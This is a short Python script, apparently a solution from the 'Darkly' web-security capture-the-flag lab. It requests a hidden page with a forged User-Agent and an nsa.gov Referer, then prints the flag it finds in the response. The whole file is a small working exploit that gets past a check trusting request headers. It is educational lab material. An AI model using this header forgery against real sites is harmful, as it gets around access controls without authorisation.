import requests

ip = input("site ip = ")

headers = {'User-Agent': "ft_bornToSec",
			'Referer': "https://www.nsa.gov/"}
try:
	response = requests.get(f"http://{ip}/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f", headers=headers)
	if response.status_code == 200:
		content = str(response.content)
		start = content.index("The flag is")
		end = content.index("<", start)
		flag = content[start:end]
		print(flag)
except Exception as e:
	print(e)
